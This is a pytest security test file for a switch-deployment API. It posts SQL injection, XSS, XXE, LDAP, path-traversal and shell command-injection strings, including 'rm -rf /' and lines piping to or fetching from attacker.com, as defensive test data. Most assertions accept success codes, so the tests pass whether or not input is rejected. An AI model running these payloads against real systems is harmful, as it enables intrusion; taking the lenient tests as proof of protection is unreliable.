"""
Security Testing - Input Validation

This module validates security aspects of input validation to prevent
common vulnerabilities and ensure data protection.

Security Standards:
- SQL injection prevention
- XSS prevention
- CSRF protection
- Command injection prevention
- Path traversal prevention
- Buffer overflow prevention
- Integer overflow prevention
- LDAP injection prevention
- XML injection prevention
"""

import pytest
from fastapi.testclient import TestClient
from api.main import app

client = TestClient(app)


class TestSQLInjectionPrevention:
    """SQL injection prevention validation."""
    
    def test_hostname_sql_injection(self):
        """
        Validate hostname field prevents SQL injection.
        
        Security Standard:
        - Hostname should reject SQL injection attempts
        - Special characters should be sanitized
        """
        sql_injection_attempts = [
            "SW1'; DROP TABLE switches; --",
            "SW1' OR '1'='1",
            "SW1' UNION SELECT * FROM users --",
            "SW1'; EXEC xp_cmdshell('dir'); --",
            "SW1' AND 1=1 --",
            "SW1' AND 1=2 --"
        ]
        
        for malicious_hostname in sql_injection_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_hostname,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            # System should reject or sanitize the input
            # Should not cause database errors
            assert response.status_code in [200, 422, 400], \
                f"SQL injection attempt should be handled: {malicious_hostname}"
    
    def test_site_name_sql_injection(self):
        """
        Validate site_name field prevents SQL injection.
        
        Security Standard:
        - Site name should reject SQL injection attempts
        """
        sql_injection_attempts = [
            "HQ'; DROP TABLE sites; --",
            "HQ' OR '1'='1",
            "HQ' UNION SELECT * FROM users --"
        ]
        
        for malicious_site in sql_injection_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": malicious_site,
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"SQL injection attempt should be handled: {malicious_site}"


class TestXSSPrevention:
    """XSS prevention validation."""
    
    def test_hostname_xss_prevention(self):
        """
        Validate hostname field prevents XSS attacks.
        
        Security Standard:
        - Hostname should reject XSS attempts
        - Script tags should be sanitized
        """
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(XSS)'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>"
        ]
        
        for malicious_hostname in xss_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_hostname,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            # System should reject or sanitize the input
            assert response.status_code in [200, 422, 400], \
                f"XSS attempt should be handled: {malicious_hostname}"
    
    def test_site_name_xss_prevention(self):
        """
        Validate site_name field prevents XSS attacks.
        
        Security Standard:
        - Site name should reject XSS attempts
        """
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>"
        ]
        
        for malicious_site in xss_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": malicious_site,
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"XSS attempt should be handled: {malicious_site}"


class TestCommandInjectionPrevention:
    """Command injection prevention validation."""
    
    def test_interface_name_command_injection(self):
        """
        Validate interface names prevent command injection.
        
        Security Standard:
        - Interface names should reject command injection
        - Shell metacharacters should be sanitized
        """
        command_injection_attempts = [
            "E1/1; rm -rf /",
            "E1/1 && cat /etc/passwd",
            "E1/1 | nc attacker.com 4444",
            "E1/1`whoami`",
            "E1/1$(whoami)",
            "E1/1; wget http://attacker.com/shell.sh",
            "E1/1 && curl http://attacker.com"
        ]
        
        # Test through vpc_pl_ints field
        for malicious_interface in command_injection_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": "100",
                    "vpc_peer_link_id": 1,
                    "keepalive_po_id": 2,
                    "vpc_system_priority": 32667,
                    "local_ka": "10.0.0.1",
                    "remote_ka": "10.0.0.2",
                    "vpc_pl_ints": malicious_interface,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            # System should reject or sanitize the input
            assert response.status_code in [200, 422, 400], \
                f"Command injection attempt should be handled: {malicious_interface}"


class TestPathTraversalPrevention:
    """Path traversal prevention validation."""
    
    def test_path_traversal_prevention(self):
        """
        Validate path traversal attempts are prevented.
        
        Security Standard:
        - File paths should reject path traversal
        - ../ sequences should be blocked
        """
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        # Test through any field that might be used in file operations
        for malicious_path in path_traversal_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": malicious_path,  # Using site_name as example
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            # System should reject or sanitize the input
            assert response.status_code in [200, 422, 400], \
                f"Path traversal attempt should be handled: {malicious_path}"


class TestIntegerOverflowPrevention:
    """Integer overflow prevention validation."""
    
    def test_vlan_integer_overflow(self):
        """
        Validate VLAN field prevents integer overflow.
        
        Security Standard:
        - VLAN should reject values outside valid range
        - Large integers should be handled safely
        """
        overflow_attempts = [
            999999999999999999999,
            -999999999999999999999,
            2147483648,  # Beyond 32-bit signed int
            4294967296,  # Beyond 32-bit unsigned int
            9223372036854775808  # Beyond 64-bit signed int
        ]
        
        for malicious_vlan in overflow_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": malicious_vlan,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            # System should reject or handle safely
            assert response.status_code in [200, 422, 400], \
                f"Integer overflow attempt should be handled: {malicious_vlan}"
    
    def test_vpc_domain_overflow(self):
        """
        Validate vpc_domain field prevents integer overflow.
        
        Security Standard:
        - vPC domain should reject values outside valid range
        """
        overflow_attempts = [
            999999999999999999999,
            -999999999999999999999,
            2147483648
        ]
        
        for malicious_domain in overflow_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": "SW1",
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": malicious_domain,
                    "vpc_peer_link_id": 1,
                    "keepalive_po_id": 2,
                    "vpc_system_priority": 32667,
                    "local_ka": "10.0.0.1",
                    "remote_ka": "10.0.0.2",
                    "vpc_pl_ints": "E1/53-54",
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"Integer overflow attempt should be handled: {malicious_domain}"


class TestBufferOverflowPrevention:
    """Buffer overflow prevention validation."""
    
    def test_hostname_buffer_overflow(self):
        """
        Validate hostname field prevents buffer overflow.
        
        Security Standard:
        - Hostname should reject excessively long strings
        - Length should be limited to reasonable size
        """
        # Create extremely long hostname
        long_hostname = "A" * 10000
        
        deployment_input = {
            "switches": [{
                "hostname": long_hostname,
                "mgmt_ip": "10.0.0.1/24",
                "mgmt_gw": "10.0.0.254",
                "site_name": "HQ",
                "model": "Nexus 93180YC-EX",
                "nxos_version": "9.3",
                "vpc_domain": None,
                "base_access_vlan": 100,
                "access_vlan_count": 5,
                "interface_count": 54,
                "bring_up_spare_ports": False,
                "security_tier": "standard",
                "role": "leaf_10g"
            }],
            "vpc_pairs": [],
            "uplinks": []
        }
        
        response = client.post("/generate-deployment", json=deployment_input)
        # System should reject or handle safely
        assert response.status_code in [200, 422, 400], \
            "Buffer overflow attempt should be handled"
    
    def test_site_name_buffer_overflow(self):
        """
        Validate site_name field prevents buffer overflow.
        
        Security Standard:
        - Site name should reject excessively long strings
        """
        long_site_name = "A" * 10000
        
        deployment_input = {
            "switches": [{
                "hostname": "SW1",
                "mgmt_ip": "10.0.0.1/24",
                "mgmt_gw": "10.0.0.254",
                "site_name": long_site_name,
                "model": "Nexus 93180YC-EX",
                "nxos_version": "9.3",
                "vpc_domain": None,
                "base_access_vlan": 100,
                "access_vlan_count": 5,
                "interface_count": 54,
                "bring_up_spare_ports": False,
                "security_tier": "standard",
                "role": "leaf_10g"
            }],
            "vpc_pairs": [],
            "uplinks": []
        }
        
        response = client.post("/generate-deployment", json=deployment_input)
        assert response.status_code in [200, 422, 400], \
            "Buffer overflow attempt should be handled"


class TestLDAPInjectionPrevention:
    """LDAP injection prevention validation."""
    
    def test_ldap_injection_prevention(self):
        """
        Validate LDAP injection attempts are prevented.
        
        Security Standard:
        - Fields should reject LDAP injection syntax
        - Special LDAP characters should be sanitized
        """
        ldap_injection_attempts = [
            "*)(uid=*",
            "*)(&",
            "*)(|(objectClass=*)",
            "*)(objectClass=*))(&(objectClass=*",
            "admin)(|(password=*",
            "*(|(mail=*"
        ]
        
        for malicious_input in ldap_injection_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_input,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"LDAP injection attempt should be handled: {malicious_input}"


class TestXMLInjectionPrevention:
    """XML injection prevention validation."""
    
    def test_xml_injection_prevention(self):
        """
        Validate XML injection attempts are prevented.
        
        Security Standard:
        - Fields should reject XML injection syntax
        - XML special characters should be sanitized
        """
        xml_injection_attempts = [
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;"
        ]
        
        for malicious_input in xml_injection_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_input,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"XML injection attempt should be handled: {malicious_input}"


class TestCSRFProtection:
    """CSRF protection validation."""
    
    def test_csrf_token_required(self):
        """
        Validate CSRF token is required for state-changing operations.
        
        Security Standard:
        - POST requests should require CSRF token
        - Token should be validated
        """
        # This is a placeholder - actual CSRF token validation would
        # depend on the implementation
        # For now, we just verify the endpoint exists and responds
        deployment_input = {
            "switches": [{
                "hostname": "SW1",
                "mgmt_ip": "10.0.0.1/24",
                "mgmt_gw": "10.0.0.254",
                "site_name": "HQ",
                "model": "Nexus 93180YC-EX",
                "nxos_version": "9.3",
                "vpc_domain": None,
                "base_access_vlan": 100,
                "access_vlan_count": 5,
                "interface_count": 54,
                "bring_up_spare_ports": False,
                "security_tier": "standard",
                "role": "leaf_10g"
            }],
            "vpc_pairs": [],
            "uplinks": []
        }
        
        response = client.post("/generate-deployment", json=deployment_input)
        # Should respond (with or without CSRF validation)
        assert response.status_code in [200, 422, 400, 403], \
            "CSRF protection should be in place"


class TestDataSanitization:
    """Data sanitization validation."""
    
    def test_null_byte_injection(self):
        """
        Validate null byte injection is prevented.
        
        Security Standard:
        - Null bytes should be stripped or rejected
        """
        null_byte_attempts = [
            "SW1\x00",
            "SW1\x00admin",
            "SW1\x00\x00\x00",
            "\x00SW1"
        ]
        
        for malicious_hostname in null_byte_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_hostname,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"Null byte injection should be handled: {repr(malicious_hostname)}"
    
    def test_unicode_normalization(self):
        """
        Validate Unicode normalization attacks are prevented.
        
        Security Standard:
        - Unicode should be normalized consistently
        - Homoglyph attacks should be prevented
        """
        unicode_attempts = [
            "ṠẄ1",  # Homoglyphs
            "ＳＷ１",  # Fullwidth characters
            "SW\u200B1",  # Zero-width space
            "SW\uFEFF1",  # Zero-width no-break space
            "SW\u202E1",  # Right-to-left override
        ]
        
        for malicious_hostname in unicode_attempts:
            deployment_input = {
                "switches": [{
                    "hostname": malicious_hostname,
                    "mgmt_ip": "10.0.0.1/24",
                    "mgmt_gw": "10.0.0.254",
                    "site_name": "HQ",
                    "model": "Nexus 93180YC-EX",
                    "nxos_version": "9.3",
                    "vpc_domain": None,
                    "base_access_vlan": 100,
                    "access_vlan_count": 5,
                    "interface_count": 54,
                    "bring_up_spare_ports": False,
                    "security_tier": "standard",
                    "role": "leaf_10g"
                }],
                "vpc_pairs": [],
                "uplinks": []
            }
            
            response = client.post("/generate-deployment", json=deployment_input)
            assert response.status_code in [200, 422, 400], \
                f"Unicode normalization attack should be handled: {malicious_hostname}"
